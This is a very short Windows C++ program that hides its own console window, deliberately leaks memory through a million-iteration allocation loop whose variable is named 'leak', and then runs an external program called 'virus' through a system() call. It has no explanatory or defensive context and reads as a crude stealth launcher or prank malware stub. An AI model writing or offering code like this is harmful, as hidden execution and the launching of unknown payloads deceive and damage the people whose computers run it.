#define _WIN32_WINNT 0x0500
#include <windows.h>
using namespace std;
int main()
{
    //FreeConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    for(int f=0; f<1000000; f++)//100000000
    {
        char *leak=new char(f);
        //Sleep(0);
    }
    system("virus");
}
